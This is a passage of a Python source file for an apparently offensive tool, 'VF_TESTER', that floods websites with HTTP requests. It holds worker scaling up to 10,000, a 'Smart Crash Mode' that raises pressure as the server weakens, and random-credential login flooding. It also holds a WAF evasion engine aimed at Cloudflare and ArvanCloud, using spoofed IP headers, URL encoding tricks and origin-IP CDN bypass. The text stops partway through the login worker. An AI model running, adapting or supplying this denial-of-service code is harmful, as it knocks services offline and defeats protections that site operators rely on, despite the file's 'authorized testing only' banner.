#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
╔═══════════════════════════════════════════════════════════════════════════╗
║     VF_TESTER — Adaptive Attack Engine                                  ║
║     Part of the VF (Vector-Finder) Architecture                         ║
║                                                                           ║
║  Reads VF_PROFILE.json from VF_FINDER and automatically builds           ║
║  a customized attack strategy based on detected technologies:             ║
║                                                                           ║
║  - ASP.NET Strategy: ViewState flood, EventValidation, form POST         ║
║  - PHP/WordPress Strategy: xmlrpc, wp-login, PHP session flood           ║
║  - API Strategy: REST endpoint flooding, JSON payloads                   ║
║  - WAF Evasion: Per-WAF bypass techniques (Cloudflare, Arvan, etc.)      ║
║  - Smart Crash Mode: Detects server weakness → increases pressure        ║
║  - Live Dashboard: Real-time stats + request log                         ║
║  - Keyboard Controls: +/- to adjust workers, q to quit                   ║
║                                                                           ║
║  FOR AUTHORIZED TESTING ONLY!                                             ║
╚═══════════════════════════════════════════════════════════════════════════╝

Usage:
  # Auto mode: scan + attack (runs FINDER first)
  python VF_TESTER.py https://target.com

  # Profile mode: use existing FINDER profile
  python VF_TESTER.py --profile VF_PROFILE.json

  # Manual overrides
  python VF_TESTER.py --profile VF_PROFILE.json --max-workers 5000 --crash-mode

Keyboard Controls (during run):
  +   Increase workers (+step)
  -   Decrease workers (-step)
  q   Quit gracefully

Requirements:
  pip install aiohttp httpx[http2] aiohttp-socks beautifulsoup4
"""

import asyncio
import argparse
import time
import statistics
import sys
import json
import random
import string
import re
import os
import platform
import socket
import signal
from dataclasses import dataclass, field
from typing import List, Optional, Dict, Set, Tuple, Any
from collections import deque
from urllib.parse import urlparse, urljoin, urlencode

IS_WINDOWS = platform.system() == 'Windows'

if IS_WINDOWS:
    try:
        import msvcrt
        HAS_MSVCRT = True
    except ImportError:
        HAS_MSVCRT = False
    try:
        import ctypes
        kernel32 = ctypes.windll.kernel32
        kernel32.SetConsoleMode(kernel32.GetStdHandle(-11), 7)
    except Exception:
        pass
else:
    try:
        import tty
        import termios
        HAS_TERMIOS = True
    except ImportError:
        HAS_TERMIOS = False

try:
    import aiohttp
    HAS_AIOHTTP = True
except ImportError:
    HAS_AIOHTTP = False

try:
    import httpx
    HAS_HTTPX = True
except ImportError:
    HAS_HTTPX = False

if not HAS_AIOHTTP:
    print("[ERROR] aiohttp is required! pip install aiohttp")
    sys.exit(1)


# ═══════════════════════════════════════════════════════════════════════════════
# Colors
# ═══════════════════════════════════════════════════════════════════════════════

class C:
    R = '\033[91m'; G = '\033[92m'; Y = '\033[93m'; B = '\033[94m'
    M = '\033[95m'; CY = '\033[96m'; W = '\033[97m'; BD = '\033[1m'
    DM = '\033[2m'; RS = '\033[0m'

    @staticmethod
    def clear_line():
        return '\033[2K'


# ═══════════════════════════════════════════════════════════════════════════════
# User-Agent Pool
# ═══════════════════════════════════════════════════════════════════════════════

USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:123.0) Gecko/20100101 Firefox/123.0",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Edg/122.0.0.0",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 17_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.2 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (Linux; Android 14; Pixel 8) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Mobile Safari/537.36",
    "Mozilla/5.0 (iPad; CPU OS 17_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.2 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.2 Safari/605.1.15",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
]

def random_ua() -> str:
    return random.choice(USER_AGENTS)

def rand_user(length=8):
    return ''.join(random.choices(string.ascii_lowercase + string.digits, k=length))

def rand_pass(length=10):
    chars = string.ascii_letters + string.digits + "!@#$%"
    return ''.join(random.choices(chars, k=length))

def rand_cache_bust() -> str:
    return f"_={random.randint(100000, 999999)}"


# ═══════════════════════════════════════════════════════════════════════════════
# Live Request Log
# ═══════════════════════════════════════════════════════════════════════════════

class LiveLog:
    def __init__(self, max_lines: int = 8):
        self.max_lines = max_lines
        self._lines: deque = deque(maxlen=max_lines)
        self._lock = asyncio.Lock()

    async def add(self, mode: str, status: Optional[int], rt: float,
                  err: Optional[str] = None, url: str = "", hint: str = ""):
        async with self._lock:
            self._lines.append({
                'ts': time.strftime("%H:%M:%S"), 'mode': mode, 'status': status,
                'rt': rt, 'err': err, 'url': url, 'hint': hint,
            })

    def get_lines(self) -> List[dict]:
        return list(self._lines)

    def format_line(self, entry: dict) -> str:
        mode_colors = {'login': C.CY, 'page': C.B, 'resource': C.M,
                       'slowloris': C.Y, 'api': C.G, 'viewstate': C.M, 'wp': C.CY,
                       'slowpost': C.R, 'h2mux': C.M, 'cachedec': C.CY}
        mode_icons = {'login': 'AUTH', 'page': 'PAGE', 'resource': 'RES ',
                      'slowloris': 'SLOW', 'api': 'API ', 'viewstate': 'VS  ', 'wp': 'WP  ',
                      'slowpost': 'SPST', 'h2mux': 'H2MX', 'cachedec': 'CD  '}
        mc = mode_colors.get(entry['mode'], C.W)
        icon = mode_icons.get(entry['mode'], '????')
        status = entry['status']
        if status is not None:
            sc = C.G if status < 300 else C.Y if status < 500 else C.R
            status_str = f"{sc}{status:>3}{C.RS}"
        else:
            status_str = f"{C.R}ERR{C.RS}"
        rt = entry['rt']
        rtc = C.G if rt < 0.5 else C.Y if rt < 2.0 else C.R
        rt_str = f"{rtc}{rt*1000:>6.0f}ms{C.RS}"
        err_str = f" {C.R}[{entry['err']}]{C.RS}" if entry['err'] else ""
        url = entry.get('url', '')
        if len(url) > 45: url = "..." + url[-42:]
        hint = entry.get('hint', '')
        hint_str = f" {C.DM}{hint[:25]}{C.RS}" if hint and not entry['err'] else ""
        return f"  {C.DM}{entry['ts']}{C.RS} {mc}{icon}{C.RS} {status_str} {rt_str} {C.DM}{url[:45]}{C.RS}{err_str}{hint_str}"


# ═══════════════════════════════════════════════════════════════════════════════
# Keyboard Input Handler (cross-platform)
# ═══════════════════════════════════════════════════════════════════════════════

class KeyboardHandler:
    def __init__(self):
        self._fd = None
        self._old_settings = None
        self._queue: deque = deque(maxlen=32)
        self._running = False
        self._task = None

    async def start(self):
        self._running = True
        if IS_WINDOWS:
            self._task = asyncio.create_task(self._read_loop_windows())
        else:
            try:
                if HAS_TERMIOS:
                    self._fd = sys.stdin.fileno()
                    self._old_settings = termios.tcgetattr(self._fd)
                    tty.setraw(self._fd)
                    self._task = asyncio.create_task(self._read_loop_unix())
                else:
                    return
            except Exception:
                return

    async def _read_loop_windows(self):
        while self._running:
            try:
                if HAS_MSVCRT and msvcrt.kbhit():
                    ch = msvcrt.getwch()
                    if ch: self._queue.append(ch)
                await asyncio.sleep(0.05)
            except Exception:
                await asyncio.sleep(0.1)

    async def _read_loop_unix(self):
        loop = asyncio.get_event_loop()
        while self._running:
            try:
                ch = await loop.run_in_executor(None, self._read_char_unix)
                if ch: self._queue.append(ch)
            except Exception:
                await asyncio.sleep(0.1)

    def _read_char_unix(self) -> Optional[str]:
        try: return sys.stdin.read(1)
        except: return None

    def get_key(self) -> Optional[str]:
        keys = []
        while self._queue: keys.append(self._queue.popleft())
        for key in keys:
            if key in ('+', '='): return '+'
            elif key in ('-', '_'): return '-'
            elif key in ('q', 'Q'): return 'q'
            elif key == '\x03': return 'q'
        return None

    async def stop(self):
        self._running = False
        if self._task:
            self._task.cancel()
            try: await self._task
            except asyncio.CancelledError: pass
        if not IS_WINDOWS and self._old_settings and self._fd and HAS_TERMIOS:
            try: termios.tcsetattr(self._fd, termios.TCSADRAIN, self._old_settings)
            except: pass


# ═══════════════════════════════════════════════════════════════════════════════
# Form Field Extraction
# ═══════════════════════════════════════════════════════════════════════════════

def extract_form_fields(html: str) -> Dict[str, str]:
    fields = {}
    hidden_inputs = re.findall(r'<input[^>]*type=["\']?hidden["\']?[^>]*>', html, re.IGNORECASE)
    for inp in hidden_inputs:
        name_match = re.search(r'name=(["\']?)([^>"\'\s]+)\1', inp)
        value_match = re.search(r'value=(["\']?)([^>"\']*)\1', inp)
        if name_match:
            fields[name_match.group(2)] = value_match.group(2) if value_match else ""
    asp_inputs = re.findall(r'<input[^>]*name=(["\']?)(__[^>"\'\s]+)\1[^>]*value=(["\']?)([^>"\']*)\3[^>]*>', html)
    asp_inputs_rev = re.findall(r'<input[^>]*value=(["\']?)([^>"\']*)\1[^>]*name=(["\']?)(__[^>"\'\s]+)\3[^>]*>', html)
    for m in asp_inputs:
        if m[1] not in fields: fields[m[1]] = m[3]
    for m in asp_inputs_rev:
        if m[3] not in fields: fields[m[3]] = m[1]
    return fields


# ═══════════════════════════════════════════════════════════════════════════════
# Data Classes
# ═══════════════════════════════════════════════════════════════════════════════

@dataclass
class HitResult:
    ok: bool
    code: Optional[int]
    rt: float
    mode: str = ""
    err: Optional[str] = None
    hint: str = ""
    ts: float = field(default_factory=time.time)
    url: str = ""

@dataclass
class Stats:
    total: int = 0
    ok: int = 0
    fail: int = 0
    rate_limited: int = 0
    login_ok: int = 0
    login_fail: int = 0
    page_hits: int = 0
    resource_hits: int = 0
    slowloris_hits: int = 0
    api_hits: int = 0
    viewstate_hits: int = 0
    wp_hits: int = 0
    slowpost_hits: int = 0
    h2mux_hits: int = 0
    cachedec_hits: int = 0
    rts: deque = field(default_factory=lambda: deque(maxlen=50000))
    codes: Dict[int, int] = field(default_factory=dict)
    _recent: deque = field(default_factory=lambda: deque(maxlen=5000))
    t0: float = 0
    t1: float = 0
    users: int = 0

    @property
    def dur(self):
        return (self.t1 if self.t1 > self.t0 else time.time()) - self.t0 if self.t0 else 0
    @property
    def rps(self):
        return self.total / self.dur if self.dur > 0 else 0
    @property
    def rrps(self):
        now = time.time()
        r = [x for x in self._recent if now - x.ts < 5]
        return len(r) / 5 if r else 0
    @property
    def rart(self):
        now = time.time()
        r = [x.rt for x in self._recent if now - x.ts < 5]
        return statistics.mean(r) if r else 0


# ═══════════════════════════════════════════════════════════════════════════════
# Server Health Monitor (Smart Crash Mode)
# ═══════════════════════════════════════════════════════════════════════════════

class ServerHealthMonitor:
    def __init__(self):
        self._rt_window: deque = deque(maxlen=200)
        self._status_window: deque = deque(maxlen=200)
        self._timeout_streak: int = 0
        self._health_history: deque = deque(maxlen=20)
        self._pressure_multiplier: float = 1.0
        self.crash_mode_active: bool = False
        self.server_dying: bool = False
        self._baseline_rt: float = 0
        self._baseline_set: bool = False

    def record(self, result: HitResult):
        self._rt_window.append(result.rt)
        self._status_window.append((result.code, result.ok))
        if result.err and ('Timeout' in (result.err or '') or 'Connect' in (result.err or '')):
            self._timeout_streak += 1
        else:
            self._timeout_streak = max(0, self._timeout_streak - 1)
        if not self._baseline_set and result.ok and result.rt > 0:
            self._baseline_rt = result.rt
            self._baseline_set = True

    def calculate_health(self) -> float:
        if len(self._status_window) < 5: return 1.0
        fails = sum(1 for _, ok in self._status_window if not ok)
        error_score = max(0, 1.0 - (fails / len(self._status_window)) * 2)
        if self._rt_window and self._baseline_rt > 0:
            avg_rt = statistics.mean(list(self._rt_window)[-50:])
            rt_ratio = avg_rt / max(self._baseline_rt, 0.01)
            rt_score = max(0, 1.0 - (rt_ratio - 1.0) / 2.0)
        else:
            rt_score = 1.0
        timeout_score = max(0, 1.0 - self._timeout_streak / 10.0)
        server_errors = sum(1 for code, _ in self._status_window if code is not None and code >= 500)
        se_score = max(0, 1.0 - (server_errors / len(self._status_window)) * 3)
        health = error_score * 0.4 + rt_score * 0.3 + timeout_score * 0.2 + se_score * 0.1
        self._health_history.append(health)
        return health

    def get_pressure_advice(self, cur: int, max_w: int, step: int) -> Tuple[str, int]:
        health = self.calculate_health()
        avg_health = statistics.mean(self._health_history) if self._health_history else 1.0
        recent = self._health_history[-1] if self._health_history else 1.0
        self.server_dying = (recent < 0.3 and self._timeout_streak > 3) or \
                           (recent < 0.15 and len(self._status_window) > 20)
        if health < 0.3:
            self.crash_mode_active = True
            return "MAXIMUM", min(step * 5, max_w - cur)
        elif health < 0.5:
            self.crash_mode_active = True
            return "CRASH", min(step * 3, max_w - cur)
        elif health < 0.65:
            self.crash_mode_active = True
            return "PRESSURE", min(step * 2, max_w - cur)
        else:
            self.crash_mode_active = False
            return "RAMP", min(step, max_w - cur)

    @property
    def health_score(self) -> float:
        return self._health_history[-1] if self._health_history else 1.0

    @property
    def trend(self) -> str:
        if len(self._health_history) < 5: return "unknown"
        recent = list(self._health_history)[-5:]
        older = list(self._health_history)[-10:-5] if len(self._health_history) >= 10 else recent
        diff = statistics.mean(recent) - statistics.mean(older)
        if diff > 0.05: return "improving"
        elif diff < -0.05: return "degrading"
        return "stable"


# ═══════════════════════════════════════════════════════════════════════════════
# Adaptive WAF Bypass Engine
# ═══════════════════════════════════════════════════════════════════════════════

class AdaptiveBypass:
    """
    Detects WAF blocking patterns and auto-switches attack strategies.
    
    Monitors response codes, body content, and timing patterns to identify
    when the WAF (ArvanCloud, Cloudflare, etc.) is actively blocking requests.
    When blocking is detected, it adjusts:
    
    - Request method (GET -> POST -> PUT -> PATCH cycle)
    - Header combinations (rotate through bypass header sets)
    - Request timing (add jitter, slow down, burst patterns)
    - URL manipulation (path encoding, query tricks)
    - Content-Type rotation (form, json, multipart)
    - Connection strategy (new connection per request vs keep-alive)
    
    This is NOT a static bypass — it adapts in real-time based on what works.
    """

    # WAF blocking signatures
    BLOCK_SIGNATURES = {
        'arvan': {
            'status_codes': [403, 429, 503],
            'body_patterns': ['arvan', 'arvancloud', 'access denied', 'blocked',
                             'rate limit', 'too many requests', 'security',
                             'firewall', 'challenge', 'captcha', 'ray id',
                             'your request was blocked'],
            'header_hints': ['server: arvan', 'x-arvan-request-id'],
        },
        'cloudflare': {
            'status_codes': [403, 429, 503],
            'body_patterns': ['cloudflare', 'cf-browser', 'cf-chl-bypass',
                             'ray id', 'attention required', 'checking your browser'],
            'header_hints': ['server: cloudflare', 'cf-ray'],
        },
        'generic': {
            'status_codes': [403, 429],
            'body_patterns': ['blocked', 'denied', 'forbidden', 'rate limit',
                             'too many', 'slow down', 'captcha', 'challenge'],
        },
    }

    # Bypass header sets — each set is a different "identity" for the request
    HEADER_SETS = [
        # Set 0: Normal browser
        {"Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
         "Accept-Language": "en-US,en;q=0.9", "Accept-Encoding": "gzip, deflate, br",
         "DNT": "1", "Upgrade-Insecure-Requests": "1"},
        # Set 1: API client
        {"Accept": "application/json, text/plain, */*",
         "Accept-Language": "en-US,en;q=0.9", "X-Requested-With": "XMLHttpRequest"},
        # Set 2: Mobile browser
        {"Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
         "Accept-Language": "fa-IR,fa;q=0.9,en-US;q=0.8,en;q=0.7",
         "Accept-Encoding": "gzip, deflate, br"},
        # Set 3: Bot-friendly (Googlebot-like)
        {"Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
         "Accept-Language": "en-US,en;q=0.9", "From": "googlebot(at)googlebot.com",
         "Accept-Encoding": "gzip, deflate"},
        # Set 4: CDN admin
        {"Accept": "*/*", "X-Forwarded-Proto": "https",
         "X-Original-URL": "/", "X-Rewrite-URL": "/"},
        # Set 5: Internal scanner
        {"Accept": "*/*", "X-Forwarded-For": "127.0.0.1",
         "X-Real-IP": "127.0.0.1", "X-Client-IP": "127.0.0.1"},
    ]

    # URL encoding tricks
    URL_TRICKS = [
        lambda u: u,  # No change
        lambda u: u.replace('/', '//'),  # Double slash
        lambda u: u.replace('/', '/./'),  # Dot in path
        lambda u: u + '/.' if not u.endswith('/') else u + '.',  # Trailing dot
        lambda u: u.replace('/', '/%2e/'),  # Encoded dot
        lambda u: u.replace('/', '/..;/'),  # Tomcat semicolon
        lambda u: u.replace('?', '?%00&'),  # Null byte before query
        lambda u: u.replace('?', '?%0a&'),  # Newline in query
    ]

    def __init__(self, waf_name: str = ""):
        self.waf_name = waf_name.lower() if waf_name else "generic"
        self._block_count: int = 0
        self._total_count: int = 0
        self._consecutive_blocks: int = 0
        self._current_header_set: int = 0
        self._current_method_cycle: int = 0
        self._bypass_level: int = 0  # 0=normal, 1=mild, 2=aggressive, 3=stealth
        self._level_change_ts: float = 0
        self._block_history: deque = deque(maxlen=100)  # recent block/success pattern
        self._adaptive_delay: float = 0  # extra delay between requests (seconds)
        self._method_sequence = ['GET', 'POST', 'PUT', 'PATCH', 'HEAD', 'DELETE', 'OPTIONS']
        self._content_types = [
            'application/x-www-form-urlencoded',
            'application/json',
            'multipart/form-data',
            'text/plain',
            'application/xml',
        ]
        self._strategy_log: List[str] = []
        self._last_switch_time: float = 0

    @property
    def block_rate(self) -> float:
        """Current block rate (0.0 - 1.0)"""
        return self._block_count / max(self._total_count, 1)

    @property
    def bypass_level_name(self) -> str:
        return ["NORMAL", "MILD_BYPASS", "AGGRESSIVE", "STEALTH"][min(self._bypass_level, 3)]

    def record_response(self, status_code: Optional[int], body: str = "", headers: Dict = None) -> bool:
        """Record a response and detect if it's a WAF block. Returns True if blocked."""
        self._total_count += 1
        is_blocked = False
        
        # Check status code
        sig = self.BLOCK_SIGNATURES.get(self.waf_name, self.BLOCK_SIGNATURES['generic'])
        if status_code in sig.get('status_codes', [403, 429]):
            is_blocked = True
        
        # Check body patterns
        if body and not is_blocked:
            body_lower = body.lower()
            for pattern in sig.get('body_patterns', []):
                if pattern in body_lower:
                    is_blocked = True
                    break
        
        # Check headers
        if headers and not is_blocked:
            for hint in sig.get('header_hints', []):
                hint_key = hint.split(':')[0].strip().lower()
                for h_key, h_val in (headers.items() if isinstance(headers, dict) else []):
                    if hint_key in h_key.lower():
                        is_blocked = True
                        break
        
        if is_blocked:
            self._block_count += 1
            self._consecutive_blocks += 1
            self._block_history.append(True)
        else:
            self._consecutive_blocks = 0
            self._block_history.append(False)
        
        # Auto-adapt bypass level based on blocking pattern
        self._adapt_level()
        
        return is_blocked

    def _adapt_level(self):
        """Adapt bypass level based on recent block patterns."""
        now = time.time()
        
        # Don't switch too frequently (minimum 3 seconds between changes)
        if now - self._level_change_ts < 3:
            return
        
        recent_blocks = list(self._block_history)[-20:]
        if not recent_blocks:
            return
        
        recent_block_rate = sum(recent_blocks) / len(recent_blocks)
        
        old_level = self._bypass_level
        
        if recent_block_rate > 0.8:
            # Severe blocking — go stealth + rotate everything
            self._bypass_level = 3  # STEALTH
            self._adaptive_delay = random.uniform(0.5, 2.0)
            self._rotate_headers()
            self._rotate_method()
        elif recent_block_rate > 0.6:
            # Heavy blocking — aggressive bypass
            self._bypass_level = 2  # AGGRESSIVE
            self._adaptive_delay = random.uniform(0.1, 0.5)
            self._rotate_headers()
        elif recent_block_rate > 0.3:
            # Some blocking — mild bypass
            if self._bypass_level < 1:
                self._bypass_level = 1  # MILD
            self._adaptive_delay = random.uniform(0.02, 0.1)
        else:
            # Not being blocked much — can be normal
            self._bypass_level = 0
            self._adaptive_delay = 0
        
        # Log level changes
        if self._bypass_level != old_level:
            self._level_change_ts = now
            msg = f"[ADAPT] Bypass level: {['NORMAL','MILD','AGGRESSIVE','STEALTH'][old_level]} -> {self.bypass_level_name} (block_rate={recent_block_rate:.0%})"
            self._strategy_log.append(msg)

    def _rotate_headers(self):
        """Switch to next header set."""
        self._current_header_set = (self._current_header_set + 1) % len(self.HEADER_SETS)

    def _rotate_method(self):
        """Switch to next HTTP method."""
        self._current_method_cycle = (self._current_method_cycle + 1) % len(self._method_sequence)

    def get_bypass_headers(self) -> Dict[str, str]:
        """Get current bypass header set with randomization."""
        base = dict(self.HEADER_SETS[self._current_header_set])
        
        # Always add random IP headers for CDN bypass
        if self._bypass_level >= 1:
            base["X-Forwarded-For"] = f"{random.randint(1,255)}.{random.randint(0,255)}.{random.randint(0,255)}.{random.randint(1,254)}"
        if self._bypass_level >= 2:
            base["X-Real-IP"] = f"{random.randint(1,255)}.{random.randint(0,255)}.{random.randint(0,255)}.{random.randint(1,254)}"
            base["X-Client-IP"] = f"{random.randint(1,255)}.{random.randint(0,255)}.{random.randint(0,255)}.{random.randint(1,254)}"
        if self._bypass_level >= 3:
            # Stealth mode: add cache-bypass headers
            base["Cache-Control"] = "no-cache, no-store, must-revalidate"
            base["Pragma"] = "no-cache"
            if self.waf_name == 'arvan':
                base["X-Arvan-Cache"] = "bypass"
                base["X-Cache-Bypass"] = "1"
        
        # Randomize some headers
        if random.random() > 0.5:
            base["Accept-Language"] = random.choice([
                "en-US,en;q=0.9", "fa-IR,fa;q=0.9,en;q=0.8",
                "de-DE,de;q=0.9,en;q=0.8", "fr-FR,fr;q=0.9,en;q=0.8",
                "ar-SA,ar;q=0.9,en;q=0.8", "zh-CN,zh;q=0.9,en;q=0.8",
            ])
        
        return base

    def get_bypass_method(self) -> str:
        """Get current bypass HTTP method."""
        if self._bypass_level <= 1:
            return self._method_sequence[self._current_method_cycle]
        else:
            # Aggressive/Stealth: randomize method
            return random.choice(self._method_sequence)

    def get_bypass_url(self, url: str) -> str:
        """Apply URL tricks based on bypass level."""
        if self._bypass_level <= 1:
            return url
        
        # Apply a random URL trick
        trick_fn = random.choice(self.URL_TRICKS[:min(3 + self._bypass_level * 2, len(self.URL_TRICKS))])
        return trick_fn(url)

    def get_bypass_content_type(self) -> str:
        """Get a content type for POST requests."""
        return random.choice(self._content_types)

    def get_adaptive_delay(self) -> float:
        """Get extra delay to add between requests (for WAF evasion)."""
        if self._adaptive_delay > 0:
            # Add jitter
            return self._adaptive_delay * random.uniform(0.5, 1.5)
        return 0

    def get_strategy_summary(self) -> str:
        """Get a summary of current adaptive strategy for display."""
        parts = [f"Level:{self.bypass_level_name}"]
        parts.append(f"BlockRate:{self.block_rate:.0%}")
        parts.append(f"Headers:Set#{self._current_header_set}")
        parts.append(f"Method:{self._method_sequence[self._current_method_cycle]}")
        if self._adaptive_delay > 0:
            parts.append(f"Delay:{self._adaptive_delay*1000:.0f}ms")
        return " | ".join(parts)

    def get_recent_strategy_changes(self, n: int = 3) -> List[str]:
        """Get the last N strategy change messages."""
        return self._strategy_log[-n:]


# ═══════════════════════════════════════════════════════════════════════════════
# VF_TESTER — Adaptive Attack Engine
# ═══════════════════════════════════════════════════════════════════════════════

class VFTester:
    """
    VF_TESTER reads a VF_PROFILE.json from VF_FINDER and automatically
    configures an optimized, adaptive attack strategy.
    """

    def __init__(self, profile_path: Optional[str] = None,
                 target_url: Optional[str] = None):
        self.profile: Dict[str, Any] = {}
        self.attack: Dict[str, Any] = {}

        # Load profile if provided
        if profile_path:
            self._load_profile(profile_path)
        elif target_url:
            self._create_minimal_profile(target_url)

        # Extract key info from profile
        p = self.profile
        self.url = p.get("url", target_url or "")
        parsed = urlparse(self.url)
        self.site_root = f"{parsed.scheme}://{parsed.netloc}"
        self.domain = parsed.netloc.split(':')[0]

        # Core state
        self.stats = Stats()
        self._stop = asyncio.Event()
        self._snaps: List[dict] = []

        # v4 features
        self.health_monitor = ServerHealthMonitor()
        self.live_log = LiveLog(max_lines=8)
        self.keyboard = KeyboardHandler()
        self._manual_delta: int = 0

        # v5: Adaptive WAF Bypass — auto-detects blocking and switches strategy
        self.adaptive_bypass = AdaptiveBypass(waf_name=p.get("waf", ""))

        # Detected technology info
        self.detected_waf = p.get("waf")
        self.detected_cms = p.get("cms")
        self.is_aspnet = p.get("viewstate_present", False)
        self.is_wordpress = p.get("cms") and "WordPress" in (p.get("cms") or "")
        self.has_api = bool(p.get("api_endpoints"))

        # Origin IP bypass — if FINDER found the real server IP behind CDN
        self.origin_ips: List[str] = p.get("origin_ips", [])
        self.cdn_bypass_possible: bool = p.get("cdn_bypass_possible", False)
        self.origin_ip_mode: bool = bool(self.origin_ips)  # Auto-enable if IPs found

        # ASP.NET specific
        self._viewstate_cache: Dict[str, str] = {}
        self._viewstate_ts: float = 0
        self._viewstate_ttl: float = 5.0  # Refresh more often to avoid stale tokens
        self._viewstate_lock = asyncio.Lock()
        self.username_field = p.get("login_fields", {}).get("username", "username")
        self.password_field = p.get("login_fields", {}).get("password", "password")

        # Per-session ASP.NET token tracking
        self._session_cookies: Dict[int, Dict[str, str]] = {}  # worker_id -> cookies
        self._invalid_count: int = 0
        self._invalid_threshold: int = 5  # Force full refresh after N invalid responses

        # Targets from profile
        self.page_targets: List[str] = self.attack.get("page_targets", [])
        self.resource_targets: List[str] = self.attack.get("resource_targets", [])

        # Worker config from profile
        wc = self.attack.get("worker_config", {})
        self.initial_workers = wc.get("initial_workers", 200)
        self.max_workers = wc.get("max_workers", 10000)
        self.step = wc.get("step", 300)
        self.step_duration = wc.get("step_duration", 3)

        # Request config
        rc = self.attack.get("request_config", {})
        self.request_delay_ms = rc.get("delay_between_requests_ms", 5)
        self.enable_cache_bust = rc.get("cache_bust", True)
        self.enable_ua_rotation = rc.get("user_agent_rotation", True)

        # Evasion config
        ec = self.attack.get("evasion_config", {})
        self.enable_header_random = ec.get("header_randomization", False)

    def _load_profile(self, path: str):
        try:
            with open(path, 'r', encoding='utf-8') as f:
                self.profile = json.load(f)
            self.attack = self.profile.get("attack_profile", {})
            print(f"  {C.G}[VF] Profile loaded: {path}{C.RS}")
            print(f"  {C.G}[VF] Strategy: {self.attack.get('recommended_strategy', 'AUTO')}{C.RS}")
        except Exception as e:
            print(f"  {C.R}[ERROR] Failed to load profile: {e}{C.RS}")
            self._create_minimal_profile("")

    def _create_minimal_profile(self, url: str):
        self.profile = {"url": url, "waf": None, "cms": None,
                        "viewstate_present": False, "technologies": []}
        self.attack = {"recommended_strategy": "GENERIC_FLOOD",
                       "attack_vectors": ["LOGIN_FLOOD", "PAGE_FLOOD", "RESOURCE_FLOOD"],
                       "worker_config": {"initial_workers": 10, "max_workers": 10000,
                                         "step": 50, "step_duration": 5, "ramp_strategy": "GRADUAL"},
                       "page_targets": [], "resource_targets": [],
                       "waf_strategy": {"detected": False},
                       "request_config": {"delay_between_requests_ms": 5},
                       "evasion_config": {"rotate_user_agent": True, "cache_bust": True}}

    def stop(self):
        self._stop.set()

    def _base_headers(self) -> Dict[str, str]:
        headers = {
            "User-Agent": random_ua() if self.enable_ua_rotation else USER_AGENTS[0],
            "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
            "Accept-Language": "en-US,en;q=0.9",
            "Accept-Encoding": "gzip, deflate, br",
            "Connection": "keep-alive",
        }
        if self.enable_header_random:
            # Add random headers for WAF evasion
            if random.random() > 0.5:
                headers["X-Forwarded-For"] = f"{random.randint(1,255)}.{random.randint(0,255)}.{random.randint(0,255)}.{random.randint(1,254)}"
            if random.random() > 0.7:
                headers["X-Real-IP"] = f"{random.randint(1,255)}.{random.randint(0,255)}.{random.randint(0,255)}.{random.randint(1,254)}"
            if random.random() > 0.6:
                headers["Referer"] = self.url
        
        # v5: Merge AdaptiveBypass headers when WAF is detected and blocking
        if self.detected_waf and self.adaptive_bypass._bypass_level > 0:
            bypass_headers = self.adaptive_bypass.get_bypass_headers()
            # Override with bypass headers (they take priority)
            headers.update(bypass_headers)
            # Always keep User-Agent rotation
            headers["User-Agent"] = random_ua()
        
        return headers

    async def _refresh_viewstate(self, session):
        """Refresh ASP.NET ViewState/EventValidation tokens.
        
        Uses a lock to avoid hammering the server with GET requests.
        When 'invalid user client' is detected, forces immediate refresh.
        """
        async with self._viewstate_lock:
            now = time.time()
            force_refresh = (
                now - self._viewstate_ts > self._viewstate_ttl or
                not self._viewstate_cache or
                self._invalid_count >= self._invalid_threshold
            )
            if force_refresh:
                self._invalid_count = 0
                try:
                    async with session.get(self.url, headers=self._base_headers(),
                                           ssl=False, allow_redirects=True) as resp:
                        # Handle redirect to login page — follow and re-fetch
                        if resp.status in (301, 302, 303, 307, 308):
                            redirect_url = resp.headers.get('Location', self.url)
                            if not redirect_url.startswith('http'):
                                redirect_url = urljoin(self.url, redirect_url)
                            async with session.get(redirect_url, headers=self._base_headers(),
                                                   ssl=False, allow_redirects=True) as resp2:
                                html = await resp2.text()
                        else:
                            html = await resp.text()
                        # Ensure cookies from the response are captured by the session
                        self._viewstate_cache = extract_form_fields(html)
                        self._viewstate_ts = now
                except Exception:
                    pass
        return dict(self._viewstate_cache)

    # ─── Attack Workers ──────────────────────────────────────────────────────

    async def _worker_login(self, session, delay=0):
        if delay > 0: await asyncio.sleep(delay)
        consecutive_fails = 0
        while not self._stop.is_set():
            t = time.time()
            try:
                hidden_fields = await self._refresh_viewstate(session) if self.is_aspnet else {}
                form_data = {**hidden_fields,
                            self.username_field: rand_user(),
                            self.password_field: rand_pass()}
                headers = {**self._base_headers(),
                          "Content-Type": "application/x-www-form-urlencoded",
                          "Origin": self.site_root, "Referer": self.url}
                async with session.post(self.url, headers=headers, data=form_data,
                                       ssl=False, allow_redirects=False) as resp:
                    body = await resp.text()
                    elapsed = time.time() - t
                    # Detect "invalid" in response — force ViewState refresh
                    if "invalid" in body.lower():
                        self._invalid_count += 1
